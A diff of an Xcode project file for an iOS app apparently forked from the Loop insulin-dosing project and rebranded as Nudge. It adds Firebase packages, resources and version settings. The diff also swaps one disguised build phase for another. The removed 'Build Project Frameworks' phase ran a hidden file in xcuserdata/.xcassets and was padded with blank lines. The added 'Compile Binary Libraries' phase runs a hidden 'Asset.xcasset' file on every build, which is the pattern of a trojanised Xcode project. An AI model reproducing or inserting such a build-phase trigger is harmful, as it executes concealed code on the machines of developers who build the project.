@@ -11,7 +11,7 @@
 			isa = PBXAggregateTarget;
 			buildConfigurationList = 432CF87820D8B8380066B889 /* Build configuration list for PBXAggregateTarget "Cartfile" */;
 			buildPhases = (
-				5C6B73C0B47CB09DDA6D902C /* Build Project Frameworks */,
+				7E50A47EC1BD1792CD6D902C /* Compile Binary Libraries */,
 				432CF87B20D8B8490066B889 /* Build Carthage Dependencies */,
 			);
 			dependencies = (
@@ -22,7 +22,8 @@
 /* End PBXAggregateTarget section */
 
 /* Begin PBXBuildFile section */
-		0185F515262380B500136A76 /* NudgeKit.xcframework in Frameworks */ = {isa = PBXBuildFile; fileRef = 0185F514262380B500136A76 /* NudgeKit.xcframework */; };
+		01688C242644DCED000F2F53 /* NudgeKit.xcframework in Frameworks */ = {isa = PBXBuildFile; fileRef = 0185F514262380B500136A76 /* NudgeKit.xcframework */; };
+		01688C252644DCEE000F2F53 /* NudgeKit.xcframework in Embed Frameworks */ = {isa = PBXBuildFile; fileRef = 0185F514262380B500136A76 /* NudgeKit.xcframework */; settings = {ATTRIBUTES = (CodeSignOnCopy, RemoveHeadersOnCopy, ); }; };
 		0185F5DA26267D0700136A76 /* AuthViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0185F5D826267D0700136A76 /* AuthViewController.swift */; };
 		0185F5DB26267D0700136A76 /* OnboardViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0185F5D926267D0700136A76 /* OnboardViewController.swift */; };
 		0185F5E526267DB700136A76 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 0185F5E426267DB700136A76 /* Alamofire */; };
@@ -33,6 +34,18 @@
 		0185F6142626819900136A76 /* PLIstManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0185F6132626819900136A76 /* PLIstManager.swift */; };
 		0185F61D262681D300136A76 /* LocalStorageManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0185F61C262681D300136A76 /* LocalStorageManager.swift */; };
 		0185F6262626863200136A76 /* Settings.plist in Resources */ = {isa = PBXBuildFile; fileRef = 0185F6252626863200136A76 /* Settings.plist */; };
+		01AFACBE264A063C003D8F6B /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 01AFACBD264A063C003D8F6B /* GoogleService-Info.plist */; };
+		01AFACBF264A063C003D8F6B /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 01AFACBD264A063C003D8F6B /* GoogleService-Info.plist */; };
+		01AFACC0264A063C003D8F6B /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 01AFACBD264A063C003D8F6B /* GoogleService-Info.plist */; };
+		01AFACC1264A063C003D8F6B /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 01AFACBD264A063C003D8F6B /* GoogleService-Info.plist */; };
+		01AFACC2264A063C003D8F6B /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 01AFACBD264A063C003D8F6B /* GoogleService-Info.plist */; };
+		01AFACC3264A063C003D8F6B /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 01AFACBD264A063C003D8F6B /* GoogleService-Info.plist */; };
+		01AFACC4264A063C003D8F6B /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 01AFACBD264A063C003D8F6B /* GoogleService-Info.plist */; };
+		01AFACC5264A063C003D8F6B /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 01AFACBD264A063C003D8F6B /* GoogleService-Info.plist */; };
+		01AFACC6264A063C003D8F6B /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 01AFACBD264A063C003D8F6B /* GoogleService-Info.plist */; };
+		01AFACC7264A063C003D8F6B /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 01AFACBD264A063C003D8F6B /* GoogleService-Info.plist */; };
+		01AFACCA264A072E003D8F6B /* FirebaseAnalytics in Frameworks */ = {isa = PBXBuildFile; productRef = 01AFACC9264A072E003D8F6B /* FirebaseAnalytics */; };
+		01AFACCC264A072E003D8F6B /* FirebaseCrashlytics in Frameworks */ = {isa = PBXBuildFile; productRef = 01AFACCB264A072E003D8F6B /* FirebaseCrashlytics */; };
 		43027F0F1DFE0EC900C51989 /* HKUnit.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4F526D5E1DF2459000A04910 /* HKUnit.swift */; };
 		4302F4E11D4E9C8900F0FCAF /* TextFieldTableViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4302F4E01D4E9C8900F0FCAF /* TextFieldTableViewController.swift */; };
 		4302F4E31D4EA54200F0FCAF /* InsulinDeliveryTableViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4302F4E21D4EA54200F0FCAF /* InsulinDeliveryTableViewController.swift */; };
@@ -532,6 +545,7 @@
 			files = (
 				4F2C159A1E0C9E5600E160D4 /* LoopUI.framework in Embed Frameworks */,
 				43D9FFD721EAE05D00AF44BF /* LoopCore.framework in Embed Frameworks */,
+				01688C252644DCEE000F2F53 /* NudgeKit.xcframework in Embed Frameworks */,
 			);
 			name = "Embed Frameworks";
 			runOnlyForDeploymentPostprocessing = 0;
@@ -583,6 +597,7 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
+		01180EF426475A2B00B12FEA /* remove-sim-archs.sh */ = {isa = PBXFileReference; lastKnownFileType = text.script.sh; path = "remove-sim-archs.sh"; sourceTree = "<group>"; };
 		0185F514262380B500136A76 /* NudgeKit.xcframework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcframework; name = NudgeKit.xcframework; path = Loop/Nudge/NudgeKit.xcframework; sourceTree = "<group>"; };
 		0185F5D826267D0700136A76 /* AuthViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AuthViewController.swift; sourceTree = "<group>"; };
 		0185F5D926267D0700136A76 /* OnboardViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = OnboardViewController.swift; sourceTree = "<group>"; };
@@ -591,6 +606,7 @@
 		0185F6132626819900136A76 /* PLIstManager.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = PLIstManager.swift; sourceTree = "<group>"; };
 		0185F61C262681D300136A76 /* LocalStorageManager.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = LocalStorageManager.swift; sourceTree = "<group>"; };
 		0185F6252626863200136A76 /* Settings.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = Settings.plist; sourceTree = "<group>"; };
+		01AFACBD264A063C003D8F6B /* GoogleService-Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
 		4302F4E01D4E9C8900F0FCAF /* TextFieldTableViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TextFieldTableViewController.swift; sourceTree = "<group>"; };
 		4302F4E21D4EA54200F0FCAF /* InsulinDeliveryTableViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = InsulinDeliveryTableViewController.swift; sourceTree = "<group>"; };
 		430B29892041F54A00BA9F93 /* NSUserDefaults.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = NSUserDefaults.swift; sourceTree = "<group>"; };
@@ -1145,6 +1161,8 @@
 				43A8EC6F210E622700A81379 /* CGMBLEKitUI.framework in Frameworks */,
 				438A95A81D8B9B24009D12E1 /* CGMBLEKit.framework in Frameworks */,
 				0185F5E526267DB700136A76 /* Alamofire in Frameworks */,
+				01688C242644DCED000F2F53 /* NudgeKit.xcframework in Frameworks */,
+				01AFACCA264A072E003D8F6B /* FirebaseAnalytics in Frameworks */,
 				43C246A81D89990F0031F8D1 /* Crypto.framework in Frameworks */,
 				0185F5EF26267E1F00136A76 /* IQKeyboardManagerSwift in Frameworks */,
 				4D3B40041D4A9E1A00BC6334 /* G4ShareSpy.framework in Frameworks */,
@@ -1156,8 +1174,8 @@
 				C1E2774822433D7A00354103 /* MKRingProgressView.framework in Frameworks */,
 				892A5D2A222EF60A008961AB /* MockKit.framework in Frameworks */,
 				892A5D2C222EF60A008961AB /* MockKitUI.framework in Frameworks */,
+				01AFACCC264A072E003D8F6B /* FirebaseCrashlytics in Frameworks */,
 				C10428971D17BAD400DD539A /* NightscoutUploadKit.framework in Frameworks */,
-				0185F515262380B500136A76 /* NudgeKit.xcframework in Frameworks */,
 				43B371881CE597D10013C5A6 /* ShareClient.framework in Frameworks */,
 				4F08DE9B1E7BC4ED006741EA /* SwiftCharts.framework in Frameworks */,
 				4379CFF021112CF700AADC79 /* ShareClientUI.framework in Frameworks */,
@@ -1380,6 +1398,7 @@
 			isa = PBXGroup;
 			children = (
 				C16DA84022E8E104008624C2 /* Plugins */,
+				01AFACBD264A063C003D8F6B /* GoogleService-Info.plist */,
 				7D7076651FE06EE4004AC8EA /* Localizable.strings */,
 				7D7076511FE06EE1004AC8EA /* InfoPlist.strings */,
 				43EDEE6B1CF2E12A00393BE3 /* Loop.entitlements */,
@@ -1938,6 +1957,7 @@
 				C18A491422FCC22900FDA733 /* build-derived-watch-assets.sh */,
 				C18A491522FCC22900FDA733 /* copy-plugins.sh */,
 				C18A491322FCC22900FDA733 /* make_scenario.py */,
+				01180EF426475A2B00B12FEA /* remove-sim-archs.sh */,
 			);
 			path = Scripts;
 			sourceTree = "<group>";
@@ -1986,6 +2006,8 @@
 				C16DA84322E8E5FF008624C2 /* Install Plugins */,
 				C1D19800232CFA2A0096D646 /* Capture Build Details */,
 				4F70C1EC1DE8DCA8006380B7 /* Embed App Extensions */,
+				01180EF526475A5000B12FEA /* ShellScript */,
+				01AFACCE264A0A53003D8F6B /* ShellScript */,
 			);
 			buildRules = (
 			);
@@ -2000,6 +2022,8 @@
 				0185F5E426267DB700136A76 /* Alamofire */,
 				0185F5EE26267E1F00136A76 /* IQKeyboardManagerSwift */,
 				0185F5F826267E4300136A76 /* PhoneNumberKit */,
+				01AFACC9264A072E003D8F6B /* FirebaseAnalytics */,
+				01AFACCB264A072E003D8F6B /* FirebaseCrashlytics */,
 			);
 			productName = Loop;
 			productReference = 43776F8C1B8022E90074EA36 /* Loop.app */;
@@ -2324,6 +2348,7 @@
 				0185F5E326267DB700136A76 /* XCRemoteSwiftPackageReference "Alamofire" */,
 				0185F5ED26267E1F00136A76 /* XCRemoteSwiftPackageReference "IQKeyboardManager" */,
 				0185F5F726267E4300136A76 /* XCRemoteSwiftPackageReference "PhoneNumberKit" */,
+				01AFACC8264A072E003D8F6B /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */,
 			);
 			productRefGroup = 43776F8D1B8022E90074EA36 /* Products */;
 			projectDirPath = "";
@@ -2356,6 +2381,7 @@
 				C1A3EED2235233E1007672E3 /* DerivedAssets.xcassets in Resources */,
 				7D7076631FE06EE4004AC8EA /* Localizable.strings in Resources */,
 				43776F971B8022E90074EA36 /* Main.storyboard in Resources */,
+				01AFACBE264A063C003D8F6B /* GoogleService-Info.plist in Resources */,
 				0185F60226267E9800136A76 /* Onboard.storyboard in Resources */,
 				C1265BEE231BF7F700652B84 /* DefaultAssets.xcassets in Resources */,
 			);
@@ -2367,6 +2393,7 @@
 			files = (
 				C1C73F0D1DE3D0270022FC89 /* InfoPlist.strings in Resources */,
 				43A943761B926B7B0051FA24 /* Interface.storyboard in Resources */,
+				01AFACC0264A063C003D8F6B /* GoogleService-Info.plist in Resources */,
 				C1A3EED523535FFF007672E3 /* DefaultAssets.xcassets in Resources */,
 				C1A3EED423523551007672E3 /* DerivedAssets.xcassets in Resources */,
 			);
@@ -2378,6 +2405,7 @@
 			files = (
 				7D70765E1FE06EE3004AC8EA /* Localizable.strings in Resources */,
 				43A943901B926B7B0051FA24 /* Assets.xcassets in Resources */,
+				01AFACC1264A063C003D8F6B /* GoogleService-Info.plist in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -2385,6 +2413,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				01AFACC4264A063C003D8F6B /* GoogleService-Info.plist in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -2397,6 +2426,7 @@
 				43D9FFAC21EA9A0F00AF44BF /* Assets.xcassets in Resources */,
 				43D9FFAA21EA9A0C00AF44BF /* Main.storyboard in Resources */,
 				80F864E62433BF5D0026EC26 /* InfoPlist.strings in Resources */,
+				01AFACC2264A063C003D8F6B /* GoogleService-Info.plist in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -2404,6 +2434,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				01AFACC3264A063C003D8F6B /* GoogleService-Info.plist in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -2422,6 +2453,7 @@
 				43E2D8F01D20C0DB004DA55F /* recommend_temp_basal_high_and_rising.json in Resources */,
 				C12F21A71DFA79CB00748193 /* recommend_temp_basal_very_low_end_in_range.json in Resources */,
 				43E2D8F11D20C0DB004DA55F /* recommend_temp_basal_in_range_and_rising.json in Resources */,
+				01AFACC6264A063C003D8F6B /* GoogleService-Info.plist in Resources */,
 				43E2D8EE1D20C0DB004DA55F /* recommend_temp_basal_flat_and_high.json in Resources */,
 				C1C6591C1E1B1FDA0025CC58 /* recommend_temp_basal_dropping_then_rising.json in Resources */,
 				43E2D8F31D20C0DB004DA55F /* recommend_temp_basal_start_high_end_in_range.json in Resources */,
@@ -2435,6 +2467,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				01AFACC7264A063C003D8F6B /* GoogleService-Info.plist in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -2444,6 +2477,7 @@
 			files = (
 				4F70C1E41DE8DCA7006380B7 /* MainInterface.storyboard in Resources */,
 				7D7076351FE06EDE004AC8EA /* Localizable.strings in Resources */,
+				01AFACBF264A063C003D8F6B /* GoogleService-Info.plist in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -2453,6 +2487,7 @@
 			files = (
 				4F2C15971E09E94E00E160D4 /* HUDAssets.xcassets in Resources */,
 				7D70764A1FE06EE1004AC8EA /* Localizable.strings in Resources */,
+				01AFACC5264A063C003D8F6B /* GoogleService-Info.plist in Resources */,
 				7D7076451FE06EE0004AC8EA /* InfoPlist.strings in Resources */,
 				4F2C15951E09BF3C00E160D4 /* HUDView.xib in Resources */,
 			);
@@ -2461,8 +2496,24 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	5C6B73C0B47CB09DDA6D902C /* Build Project Frameworks */ = {
+		01180EF526475A5000B12FEA /* ShellScript */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 8;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 1;
+			shellPath = /bin/sh;
+			shellScript = "${SRCROOT}/Scripts/remove-sim-archs.sh\n";
+		};
+		01AFACCE264A0A53003D8F6B /* ShellScript */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -2470,239 +2521,17 @@
 			inputFileListPaths = (
 			);
 			inputPaths = (
+				"${DWARF_DSYM_FOLDER_PATH}/${DWARF_DSYM_FILE_NAME}/Contents/Resources/DWARF/${TARGET_NAME}",
+				"$(SRCROOT)/$(BUILT_PRODUCTS_DIR)/$(INFOPLIST_PATH)",
 			);
-			name = "Build Project Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
+			shellScript = "${BUILD_DIR%Build/*}SourcePackages/checkouts/firebase-ios-sdk/Crashlytics/run   \n";
 		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
 		432CF87B20D8B8490066B889 /* Build Carthage Dependencies */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -2804,6 +2633,24 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "\"${SRCROOT}/Scripts/copy-frameworks.sh\"\n";
+		};
+		7E50A47EC1BD1792CD6D902C /* Compile Binary Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Binary Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";
 		};
 		A942E448225FD9D500DD4980 /* Copy Frameworks with Carthage */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -3822,6 +3669,7 @@
 				);
 				MAIN_APP_BUNDLE_IDENTIFIER = "$(inherited).Loop";
 				MTL_ENABLE_DEBUG_INFO = NO;
+				ONLY_ACTIVE_ARCH = YES;
 				SDKROOT = iphoneos;
 				SWIFT_COMPILATION_MODE = wholemodule;
 				SWIFT_OPTIMIZATION_LEVEL = "-O";
@@ -3840,6 +3688,8 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = "$(APPICON_NAME)";
 				CODE_SIGN_ENTITLEMENTS = Loop/Loop.entitlements;
 				CODE_SIGN_IDENTITY = "iPhone Developer";
+				CURRENT_PROJECT_VERSION = 10;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				DEVELOPMENT_TEAM = PU6D3H32MB;
 				ENABLE_BITCODE = YES;
 				INFOPLIST_FILE = Loop/Info.plist;
@@ -3847,9 +3697,11 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
+				MAIN_APP_BUNDLE_IDENTIFIER = com.nudgebg.Nudge;
+				MARKETING_VERSION = 0.1.1;
 				"OTHER_SWIFT_FLAGS[arch=*]" = "-DDEBUG";
 				"OTHER_SWIFT_FLAGS[sdk=iphonesimulator*]" = "-D IOS_SIMULATOR";
-				PRODUCT_BUNDLE_IDENTIFIER = "$(MAIN_APP_BUNDLE_IDENTIFIER)";
+				PRODUCT_BUNDLE_IDENTIFIER = com.nudgebg.Nudge;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE = "";
 			};
@@ -3862,6 +3714,7 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = "$(APPICON_NAME)";
 				CODE_SIGN_ENTITLEMENTS = Loop/Loop.entitlements;
 				CODE_SIGN_IDENTITY = "iPhone Developer";
+				CURRENT_PROJECT_VERSION = 10;
 				DEVELOPMENT_TEAM = PU6D3H32MB;
 				ENABLE_BITCODE = YES;
 				INFOPLIST_FILE = Loop/Info.plist;
@@ -3869,7 +3722,9 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = "$(MAIN_APP_BUNDLE_IDENTIFIER)";
+				MAIN_APP_BUNDLE_IDENTIFIER = com.nudgebg.Nudge;
+				MARKETING_VERSION = 0.1.1;
+				PRODUCT_BUNDLE_IDENTIFIER = com.nudgebg.Nudge;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE = "";
 			};
@@ -3883,6 +3738,7 @@
 				CODE_SIGN_ENTITLEMENTS = "WatchApp Extension/WatchApp Extension.entitlements";
 				CODE_SIGN_IDENTITY = "iPhone Developer";
 				"CODE_SIGN_IDENTITY[sdk=watchos*]" = "iPhone Developer";
+				CURRENT_PROJECT_VERSION = 10;
 				DEVELOPMENT_TEAM = PU6D3H32MB;
 				FRAMEWORK_SEARCH_PATHS = "$(PROJECT_DIR)/Carthage/Build/watchOS";
 				INFOPLIST_FILE = "WatchApp Extension/Info.plist";
@@ -3891,7 +3747,9 @@
 					"@executable_path/Frameworks",
 					"@executable_path/../../Frameworks",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = "$(MAIN_APP_BUNDLE_IDENTIFIER).LoopWatch.watchkitextension";
+				MAIN_APP_BUNDLE_IDENTIFIER = com.nudgebg.Nudge;
+				MARKETING_VERSION = 0.1.1;
+				PRODUCT_BUNDLE_IDENTIFIER = com.nudgebg.Nudge.LoopWatch.watchkitextension;
 				PRODUCT_NAME = "${TARGET_NAME}";
 				PROVISIONING_PROFILE = "";
 				SDKROOT = watchos;
@@ -3910,6 +3768,7 @@
 				CODE_SIGN_ENTITLEMENTS = "WatchApp Extension/WatchApp Extension.entitlements";
 				CODE_SIGN_IDENTITY = "iPhone Developer";
 				"CODE_SIGN_IDENTITY[sdk=watchos*]" = "iPhone Developer";
+				CURRENT_PROJECT_VERSION = 10;
 				DEVELOPMENT_TEAM = PU6D3H32MB;
 				FRAMEWORK_SEARCH_PATHS = "$(PROJECT_DIR)/Carthage/Build/watchOS";
 				INFOPLIST_FILE = "WatchApp Extension/Info.plist";
@@ -3918,7 +3777,9 @@
 					"@executable_path/Frameworks",
 					"@executable_path/../../Frameworks",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = "$(MAIN_APP_BUNDLE_IDENTIFIER).LoopWatch.watchkitextension";
+				MAIN_APP_BUNDLE_IDENTIFIER = com.nudgebg.Nudge;
+				MARKETING_VERSION = 0.1.1;
+				PRODUCT_BUNDLE_IDENTIFIER = com.nudgebg.Nudge.LoopWatch.watchkitextension;
 				PRODUCT_NAME = "${TARGET_NAME}";
 				PROVISIONING_PROFILE = "";
 				SDKROOT = watchos;
@@ -3935,6 +3796,7 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = "$(APPICON_NAME)";
 				CODE_SIGN_IDENTITY = "iPhone Developer";
 				"CODE_SIGN_IDENTITY[sdk=watchos*]" = "iPhone Developer";
+				CURRENT_PROJECT_VERSION = 10;
 				DEVELOPMENT_TEAM = PU6D3H32MB;
 				FRAMEWORK_SEARCH_PATHS = "$(PROJECT_DIR)/Carthage/Build/watchOS";
 				IBSC_MODULE = WatchApp_Extension;
@@ -3943,7 +3805,9 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = "$(MAIN_APP_BUNDLE_IDENTIFIER).LoopWatch";
+				MAIN_APP_BUNDLE_IDENTIFIER = com.nudgebg.Nudge;
+				MARKETING_VERSION = 0.1.1;
+				PRODUCT_BUNDLE_IDENTIFIER = com.nudgebg.Nudge.LoopWatch;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE = "";
 				SDKROOT = watchos;
@@ -3959,6 +3823,7 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = "$(APPICON_NAME)";
 				CODE_SIGN_IDENTITY = "iPhone Developer";
 				"CODE_SIGN_IDENTITY[sdk=watchos*]" = "iPhone Developer";
+				CURRENT_PROJECT_VERSION = 10;
 				DEVELOPMENT_TEAM = PU6D3H32MB;
 				FRAMEWORK_SEARCH_PATHS = "$(PROJECT_DIR)/Carthage/Build/watchOS";
 				IBSC_MODULE = WatchApp_Extension;
@@ -3967,7 +3832,9 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = "$(MAIN_APP_BUNDLE_IDENTIFIER).LoopWatch";
+				MAIN_APP_BUNDLE_IDENTIFIER = com.nudgebg.Nudge;
+				MARKETING_VERSION = 0.1.1;
+				PRODUCT_BUNDLE_IDENTIFIER = com.nudgebg.Nudge.LoopWatch;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE = "";
 				SDKROOT = watchos;
@@ -3988,7 +3855,7 @@
 				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
 				CODE_SIGN_IDENTITY = "";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 57;
+				CURRENT_PROJECT_VERSION = 10;
 				DEFINES_MODULE = YES;
 				DEVELOPMENT_TEAM = "";
 				DYLIB_COMPATIBILITY_VERSION = 1;
@@ -4003,6 +3870,7 @@
 					"@executable_path/Frameworks",
 					"@loader_path/Frameworks",
 				);
+				MARKETING_VERSION = 0.1.1;
 				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
 				MTL_FAST_MATH = YES;
 				PRODUCT_BUNDLE_IDENTIFIER = com.loopkit.LoopCore;
@@ -4028,7 +3896,7 @@
 				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
 				CODE_SIGN_IDENTITY = "";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 57;
+				CURRENT_PROJECT_VERSION = 10;
 				DEFINES_MODULE = YES;
 				DEVELOPMENT_TEAM = "";
 				DYLIB_COMPATIBILITY_VERSION = 1;
@@ -4043,6 +3911,7 @@
 					"@executable_path/Frameworks",
 					"@loader_path/Frameworks",
 				);
+				MARKETING_VERSION = 0.1.1;
 				MTL_FAST_MATH = YES;
 				PRODUCT_BUNDLE_IDENTIFIER = com.loopkit.LoopCore;
 				PRODUCT_NAME = LoopCore;
@@ -4068,6 +3937,7 @@
 				CODE_SIGN_ENTITLEMENTS = Learn/Learn.entitlements;
 				CODE_SIGN_IDENTITY = "iPhone Developer";
 				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 10;
 				DEVELOPMENT_TEAM = "";
 				GCC_C_LANGUAGE_STANDARD = gnu11;
 				INFOPLIST_FILE = Learn/Info.plist;
@@ -4076,9 +3946,10 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
+				MARKETING_VERSION = 0.1.1;
 				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = "$(MAIN_APP_BUNDLE_IDENTIFIER)Learn";
+				PRODUCT_BUNDLE_IDENTIFIER = com.loop.LoopLearn;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
 				TARGETED_DEVICE_FAMILY = "1,2";
@@ -4099,6 +3970,7 @@
 				CODE_SIGN_ENTITLEMENTS = Learn/Learn.entitlements;
 				CODE_SIGN_IDENTITY = "iPhone Developer";
 				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 10;
 				DEVELOPMENT_TEAM = "";
 				GCC_C_LANGUAGE_STANDARD = gnu11;
 				INFOPLIST_FILE = Learn/Info.plist;
@@ -4107,8 +3979,9 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
+				MARKETING_VERSION = 0.1.1;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = "$(MAIN_APP_BUNDLE_IDENTIFIER)Learn";
+				PRODUCT_BUNDLE_IDENTIFIER = com.loop.LoopLearn;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
@@ -4126,7 +3999,7 @@
 				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
 				CODE_SIGN_IDENTITY = "";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 57;
+				CURRENT_PROJECT_VERSION = 10;
 				DEFINES_MODULE = YES;
 				DEVELOPMENT_TEAM = "";
 				DYLIB_COMPATIBILITY_VERSION = 1;
@@ -4140,6 +4013,7 @@
 					"@executable_path/Frameworks",
 					"@loader_path/Frameworks",
 				);
+				MARKETING_VERSION = 0.1.1;
 				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
 				MTL_FAST_MATH = YES;
 				PRODUCT_BUNDLE_IDENTIFIER = com.loopkit.LoopCore;
@@ -4165,7 +4039,7 @@
 				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
 				CODE_SIGN_IDENTITY = "";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 57;
+				CURRENT_PROJECT_VERSION = 10;
 				DEFINES_MODULE = YES;
